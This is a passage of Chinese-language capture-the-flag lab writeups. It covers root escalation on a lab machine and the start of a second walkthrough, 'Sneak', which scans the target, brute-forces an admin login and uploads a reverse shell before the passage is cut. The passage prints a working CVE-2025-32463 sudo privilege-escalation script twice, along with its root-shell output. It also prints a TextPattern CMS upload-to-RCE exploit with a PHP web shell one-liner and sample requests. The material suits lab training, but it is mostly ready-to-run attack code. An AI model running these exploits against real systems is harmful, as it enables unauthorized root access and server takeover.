class="code"><pre><code class="hljs bash">www-data@5ud0:/var/www/html/files$ /usr/bin/sudo -V      <br>Sudo version 1.9.16p2<br>Sudoers policy plugin version 1.9.16p2<br>Sudoers file grammar version 50<br>Sudoers I/O plugin version 1.9.16p2<br>Sudoers audit plugin version 1.9.16p2<br></code></pre></td></tr></table></figure><p>发现<code>/usr/bin/sudo</code>的版本，符合<code>CVE-2025-32463</code>的影响范围</p><p>验证漏洞，存在</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@5ud0:/var/www/html/files$ /usr/bin/sudo -R woot woot <span class="hljs-built_in">sudo</span>: woot: No such file or directory<br></code></pre></td></tr></table></figure><p>使用exp进行提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-comment"># sudo-chwoot.sh</span><br><span class="hljs-comment"># CVE-2025-32463 – Sudo EoP Exploit PoC by Rich Mirch</span><br><span class="hljs-comment">#                  @ Stratascale Cyber Research Unit (CRU)</span><br>STAGE=$(<span class="hljs-built_in">mktemp</span> -d /tmp/sudowoot.stage.XXXXXX)<br><span class="hljs-built_in">cd</span> <span class="hljs-variable">$&#123;STAGE?&#125;</span> || <span class="hljs-built_in">exit</span> 1<br><br><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$#</span> -eq 0 ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-comment"># If no command is provided, default to an interactive root shell.</span><br>    CMD=<span class="hljs-string">&quot;/bin/bash&quot;</span><br><span class="hljs-keyword">else</span><br>    <span class="hljs-comment"># Otherwise, use the provided arguments as the command to execute.</span><br>    CMD=<span class="hljs-string">&quot;<span class="hljs-variable">$@</span>&quot;</span><br><span class="hljs-keyword">fi</span><br><br><span class="hljs-comment"># Escape the command to safely include it in a C string literal.</span><br><span class="hljs-comment"># This handles backslashes and double quotes.</span><br>CMD_C_ESCAPED=$(<span class="hljs-built_in">printf</span> <span class="hljs-string">&#x27;%s&#x27;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$CMD</span>&quot;</span> | sed -e <span class="hljs-string">&#x27;s/\\/\\\\/g&#x27;</span> -e <span class="hljs-string">&#x27;s/&quot;/\\&quot;/g&#x27;</span>)<br><br><span class="hljs-built_in">cat</span> &gt; woot1337.c&lt;&lt;<span class="hljs-string">EOF</span><br><span class="hljs-string">#include &lt;stdlib.h&gt;</span><br><span class="hljs-string">#include &lt;unistd.h&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">__attribute__((constructor)) void woot(void) &#123;</span><br><span class="hljs-string">  setreuid(0,0);</span><br><span class="hljs-string">  setregid(0,0);</span><br><span class="hljs-string">  chdir(&quot;/&quot;);</span><br><span class="hljs-string">  execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-c&quot;, &quot;$&#123;CMD_C_ESCAPED&#125;&quot;, NULL);</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">EOF</span><br><br><span class="hljs-built_in">mkdir</span> -p woot/etc libnss_<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;passwd: /woot1337&quot;</span> &gt; woot/etc/nsswitch.conf<br><span class="hljs-built_in">cp</span> /etc/group woot/etc<br>gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c<br><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;woot!&quot;</span><br><span class="hljs-built_in">sudo</span> -R woot woot  //需要修改存在漏洞的<span class="hljs-built_in">sudo</span><br><span class="hljs-built_in">rm</span> -rf <span class="hljs-variable">$&#123;STAGE?&#125;</span><br></code></pre></td></tr></table></figure><h2 id="获取ROOT权限"><a href="#获取ROOT权限" class="headerlink" title="获取ROOT权限"></a>获取ROOT权限</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@5ud0:/var/www/html/files$ <span class="hljs-built_in">chmod</span> +x sudo-chwoot.sh <br>www-data@5ud0:/var/www/html/files$ ./sudo-chwoot.sh <br>woot!<br><br>We trust you have received the usual lecture from the <span class="hljs-built_in">local</span> System<br>Administrator. It usually boils down to these three things:<br><br>    <span class="hljs-comment">#1) Respect the privacy of others.</span><br>    <span class="hljs-comment">#2) Think before you type.</span><br>    <span class="hljs-comment">#3) With great power comes great responsibility.</span><br><br>For security reasons, the password you <span class="hljs-built_in">type</span> will not be visible.<br><br>[<span class="hljs-built_in">sudo</span>] password <span class="hljs-keyword">for</span> www-data:   //随意输入密码<br>root@5ud0:/# <span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root),33(www-data)<br>root@5ud0:/# <br></code></pre></td></tr></table></figure><p><strong>ROOT FLAG</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@5ud0:/root# <span class="hljs-built_in">cat</span> root.txt <br>flag&#123;root-257f425d-1ea4-4b8e-8dd8-69523f25d249&#125;<br></code></pre></td></tr></table></figure><h1 id="【总结】"><a href="#【总结】" class="headerlink" title="【总结】"></a>【总结】</h1><h2 id="1、Textpattern-CMS-4-8-7文件上传"><a href="#1、Textpattern-CMS-4-8-7文件上传" class="headerlink" title="1、Textpattern CMS 4.8.7文件上传"></a>1、Textpattern CMS 4.8.7文件上传</h2><p>exp</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Exploit Title : TextPattern CMS 4.8.7 - Remote Command Execution (Authenticated)</span><br><span class="hljs-comment"># Date : 2021/09/06</span><br><span class="hljs-comment"># Exploit Author : Mert Daş merterpreter@gmail.com</span><br><span class="hljs-comment"># Software Link : https://textpattern.com/file_download/113/textpattern-4.8.7.zip</span><br><span class="hljs-comment"># Software web : https://textpattern.com/</span><br><span class="hljs-comment"># Tested on: Server : Xampp</span><br><br>First of all we should use file upload section to upload our shell.<br>Our shell contains this malicious code: &lt;?PHP system(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);?&gt;<br><br>1) Go to content section .<br>2) Click Files and upload malicious php file.<br>3) go to yourserver/textpattern/files/yourphp.php?cmd=yourcode;<br><br>After upload our file , our request and respons is like below :<br><br>Request:<br><br>GET /textpattern/files/cmd.php?cmd=<span class="hljs-built_in">whoami</span> HTTP/1.1<br>Host: 127.0.0.1<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0)<br>Gecko/20100101 Firefox/89.0<br>Accept:<br>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br>Accept-Language: tr-TR,<span class="hljs-built_in">tr</span>;q=0.8,en-US;q=0.5,en;q=0.3<br>Accept-Encoding: gzip, deflate<br>Connection: close<br>Cookie: txp_login_public=18e9bf4a21admin; language=en-gb; currency=GBP;<br>PHPSESSID=cctbu6sj8571j2t6vp7g8ab7gi<br>Upgrade-Insecure-Requests: 1<br><br><br>Response:<br><br>HTTP/1.1 200 OK<br>Date: Thu, 10 Jun 2021 00:32:41 GMT<br>Server: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/7.4.20<br>X-Powered-By: PHP/7.4.20<br>Content-Length: 22<br>Connection: close<br>Content-Type: text/html; charset=UTF-8<br><br>pc\mertdas<br></code></pre></td></tr></table></figure><h2 id="2、CVE-2025-32463-sudo提权"><a href="#2、CVE-2025-32463-sudo提权" class="headerlink" title="2、CVE-2025-32463-sudo提权"></a>2、CVE-2025-32463-sudo提权</h2><p>漏洞允许本地攻击者通过 -R ( –chroot ) 选项诱骗 Sudo 使用用户指定的根目录加载任意共享库，从而提升权限。攻击者可以在支持 <code>/etc/nsswitch.conf</code> 的系统上以 root 身份运行任意命令，进而控制系统（安装恶意软件、窃取数据、破坏系统完整性）。</p><table><thead><tr><th>指标</th><th>CVE-2025-32463</th><th>CVE-2025-32462</th></tr></thead><tbody><tr><td>CVSS 3.1评分</td><td>9.3（严重）</td><td>7.0（中危）</td></tr><tr><td>攻击复杂度</td><td>低（默认配置）</td><td>中（非默认配置）</td></tr><tr><td>核心风险</td><td>本地用户 -&gt; root 提权<br><br>chroot 路径隔离失效导致加载恶意 NSS 库</td><td>绕过 Sudo 规则限制<br><br>符号链接解析漏洞导致执行未授权命令</td></tr><tr><td>影响范围</td><td>Sudo 1.9.14 – 1.9.17</td><td>Sudo 1.9.15 – 1.9.16</td></tr></tbody></table><p><strong>EXP</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-comment"># sudo-chwoot.sh</span><br><span class="hljs-comment"># CVE-2025-32463 – Sudo EoP Exploit PoC by Rich Mirch</span><br><span class="hljs-comment">#                  @ Stratascale Cyber Research Unit (CRU)</span><br>STAGE=$(<span class="hljs-built_in">mktemp</span> -d /tmp/sudowoot.stage.XXXXXX)<br><span class="hljs-built_in">cd</span> <span class="hljs-variable">$&#123;STAGE?&#125;</span> || <span class="hljs-built_in">exit</span> 1<br><br><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$#</span> -eq 0 ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-comment"># If no command is provided, default to an interactive root shell.</span><br>    CMD=<span class="hljs-string">&quot;/bin/bash&quot;</span><br><span class="hljs-keyword">else</span><br>    <span class="hljs-comment"># Otherwise, use the provided arguments as the command to execute.</span><br>    CMD=<span class="hljs-string">&quot;<span class="hljs-variable">$@</span>&quot;</span><br><span class="hljs-keyword">fi</span><br><br><span class="hljs-comment"># Escape the command to safely include it in a C string literal.</span><br><span class="hljs-comment"># This handles backslashes and double quotes.</span><br>CMD_C_ESCAPED=$(<span class="hljs-built_in">printf</span> <span class="hljs-string">&#x27;%s&#x27;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$CMD</span>&quot;</span> | sed -e <span class="hljs-string">&#x27;s/\\/\\\\/g&#x27;</span> -e <span class="hljs-string">&#x27;s/&quot;/\\&quot;/g&#x27;</span>)<br><br><span class="hljs-built_in">cat</span> &gt; woot1337.c&lt;&lt;<span class="hljs-string">EOF</span><br><span class="hljs-string">#include &lt;stdlib.h&gt;</span><br><span class="hljs-string">#include &lt;unistd.h&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">__attribute__((constructor)) void woot(void) &#123;</span><br><span class="hljs-string">  setreuid(0,0);</span><br><span class="hljs-string">  setregid(0,0);</span><br><span class="hljs-string">  chdir(&quot;/&quot;);</span><br><span class="hljs-string">  execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-c&quot;, &quot;$&#123;CMD_C_ESCAPED&#125;&quot;, NULL);</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">EOF</span><br><br><span class="hljs-built_in">mkdir</span> -p woot/etc libnss_<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;passwd: /woot1337&quot;</span> &gt; woot/etc/nsswitch.conf<br><span class="hljs-built_in">cp</span> /etc/group woot/etc<br>gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c<br><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;woot!&quot;</span><br><span class="hljs-built_in">sudo</span> -R woot woot  //注意路径<br><span class="hljs-built_in">rm</span> -rf <span class="hljs-variable">$&#123;STAGE?&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Maze-sec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Textpattern CMS</tag>
      
      <tag>文件上传</tag>
      
      <tag>CVE-2025-32463</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Sneak</title>
    <link href="/Maze-sec/Sneak/"/>
    <url>/Maze-sec/Sneak/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><p>QQ群：<code>660930334</code></p><h1 id="一、主机探测"><a href="#一、主机探测" class="headerlink" title="一、主机探测"></a>一、主机探测</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/sneak]<br>└─# nmap -sn 192.168.2.0/24              <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-14 19:04 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00052s latency).<br>MAC Address: 0A:00:27:00:00:0A (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.0011s latency).<br>MAC Address: 08:00:27:4E:1A:DF (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.57<br>Host is up (0.00085s latency).<br>MAC Address: 08:00:27:42:27:37 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.01 seconds<br></code></pre></td></tr></table></figure><p>靶机IP：<code>192.168.2.57</code></p><h1 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h1><h2 id="1、全端口扫描"><a href="#1、全端口扫描" class="headerlink" title="1、全端口扫描"></a>1、全端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/sneak]<br>└─# nmap --min-rate 10000 -p- 192.168.2.57                   <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-14 19:05 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.57<br>Host is up (0.0013s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:42:27:37 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 44.82 seconds<br></code></pre></td></tr></table></figure><p>开放端口：<code>22,80</code></p><h2 id="2、详细信息扫描"><a href="#2、详细信息扫描" class="headerlink" title="2、详细信息扫描"></a>2、详细信息扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/sneak]<br>└─# nmap --min-rate 10000 -sT -sV -sC -O -p22,80 192.168.2.57<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-14 19:06 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.57<br>Host is up (0.00092s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)<br>|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)<br>|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)<br>80/tcp open  http    Apache httpd 2.4.62 ((Debian))<br>|_http-server-header: Apache/2.4.62 (Debian)<br>|_http-title: Site doesn<span class="hljs-string">&#x27;t have a title (text/html).</span><br><span class="hljs-string">MAC Address: 08:00:27:42:27:37 (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="hljs-string">Device type: general purpose</span><br><span class="hljs-string">Running: Linux 4.X|5.X</span><br><span class="hljs-string">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="hljs-string">OS details: Linux 4.15 - 5.8</span><br><span class="hljs-string">Network Distance: 1 hop</span><br><span class="hljs-string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="hljs-string"></span><br><span class="hljs-string">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 9.10 seconds</span><br></code></pre></td></tr></table></figure><h2 id="3、UDP端口扫描"><a href="#3、UDP端口扫描" class="headerlink" title="3、UDP端口扫描"></a>3、UDP端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/sneak]<br>└─# nmap -sU --top-ports 100 192.168.2.57 <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-14 21:30 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.57<br>Host is up (0.0011s latency).<br>Not shown: 99 closed udp ports (port-unreach)<br>PORT   STATE         SERVICE<br>68/udp open|filtered dhcpc<br>MAC Address: 08:00:27:42:27:37 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 104.56 seconds<br></code></pre></td></tr></table></figure><p>没有开放的端口</p><h1 id="三、WEB渗透"><a href="#三、WEB渗透" class="headerlink" title="三、WEB渗透"></a>三、WEB渗透</h1><p>访问80端口，只有一个页面，没啥东西<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507142134257.png"></p><h2 id="1、目录扫描"><a href="#1、目录扫描" class="headerlink" title="1、目录扫描"></a>1、目录扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/sneak]<br>└─# gobuster <span class="hljs-built_in">dir</span> -u http://192.168.2.57/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html,bak<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.2.57/<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              bak,php,txt,html<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/.php                 (Status: 403) [Size: 277]<br>/index.html           (Status: 200) [Size: 6]<br>/.html                (Status: 403) [Size: 277]<br>/cms                  (Status: 301) [Size: 310] [--&gt; http://192.168.2.57/cms/]<br>/.php                 (Status: 403) [Size: 277]<br>/.html                (Status: 403) [Size: 277]<br>/server-status        (Status: 403) [Size: 277]<br>Progress: 1102800 / 1102805 (100.00%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure><p>找到一个<code>cms</code>，尝试访问，报500错误<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507142135882.png"></p><p>尝试加上<code>cms</code>后再进行目录扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/sneak]<br>└─# dirsearch -u <span class="hljs-string">&quot;http://192.168.2.57/cms&quot;</span><br>/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html<br>  from pkg_resources import DistributionNotFound, VersionConflict<br><br>  _|. _ _  _  _  _ _|_    v0.4.3<br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460<br><br>Output File: /miao/maze-sec/sneak/reports/http_192.168.2.57/_cms_25-07-14_21-33-40.txt<br><br>Target: http://192.168.2.57/<br><br>[21:33:40] Starting: cms/<br>[21:33:42] 200 -  413B  - /cms/.gitignore<br>[21:33:42] 403 -  277B  - /cms/.ht_wsr.txt<br>[21:33:42] 403 -  277B  - /cms/.htaccess.bak1<br>[21:33:42] 403 -  277B  - /cms/.htaccess.sample<br>[21:33:42] 403 -  277B  - /cms/.htaccess.orig<br>[21:33:42] 403 -  277B  - /cms/.htaccess.save<br>[21:33:42] 403 -  277B  - /cms/.htaccess_extra<br>[21:33:42] 403 -  277B  - /cms/.htaccess_orig<br>[21:33:42] 403 -  277B  - /cms/.htaccess_sc<br>[21:33:42] 403 -  277B  - /cms/.htaccessBAK<br>[21:33:42] 403 -  277B  - /cms/.htaccessOLD<br>[21:33:42] 403 -  277B  - /cms/.htaccessOLD2<br>[21:33:42] 403 -  277B  - /cms/.htm<br>[21:33:42] 403 -  277B  - /cms/.html<br>[21:33:42] 403 -  277B  - /cms/.htpasswd_test<br>[21:33:42] 403 -  277B  - /cms/.htpasswds<br>[21:33:42] 403 -  277B  - /cms/.httr-oauth<br>[21:33:44] 403 -  277B  - /cms/.php<br>[21:34:05] 200 -    0B  - /cms/config.php<br>[21:34:06] 301 -  318B  - /cms/content  -&gt;  http://192.168.2.57/cms/content/<br>[21:34:06] 200 -    0B  - /cms/content/<br>[21:34:07] 301 -  315B  - /cms/core  -&gt;  http://192.168.2.57/cms/core/<br>[21:34:17] 301 -  318B  - /cms/install  -&gt;  http://192.168.2.57/cms/install/<br>[21:34:17] 200 -  543B  - /cms/install/<br>[21:34:17] 200 -  543B  - /cms/install/index.php?upgrade/<br>[21:34:19] 301 -  314B  - /cms/lib  -&gt;  http://192.168.2.57/cms/lib/<br>[21:34:19] 200 -    0B  - /cms/lib/<br>[21:34:20] 200 -    2KB - /cms/license.txt<br>[21:34:25] 301 -  318B  - /cms/modules  -&gt;  http://192.168.2.57/cms/modules/<br>[21:34:25] 200 -    0B  - /cms/modules/<br>[21:34:36] 200 -    1KB - /cms/README.md<br>[21:34:37] 200 -   90B  - /cms/robots.txt<br>[21:34:44] 301 -  317B  - /cms/styles  -&gt;  http://192.168.2.57/cms/styles/<br><br>Task Completed<br></code></pre></td></tr></table></figure><p>在<code>/cms/acp</code>找到一个登录框<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507151422003.png"></p><h2 id="2、密码爆破"><a href="#2、密码爆破" class="headerlink" title="2、密码爆破"></a>2、密码爆破</h2><p>尝试对登录密码进行爆破，找到账号和密码<code>admin:88888888</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507151425297.png"></p><h2 id="3、文件上传"><a href="#3、文件上传" class="headerlink" title="3、文件上传"></a>3、文件上传</h2><p>进入后修改允许上传的文件类型<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507151432658.png"></p><p>上传反弹shell脚本，上传后的文件路径<code>http://192.168.2.57/cms/content/files/rev.php</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507151433252.png"></p><h2 id="4、获取www-data权限"><a href="#4、获取www-data权限" class="headerlink" title="4、获取www-data权限"></a>4、获取www-data权限</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@Sneak:/var/www/html/cms/content/files$ <span class="hljs-built_in">id</span><br>uid=33(www-data) 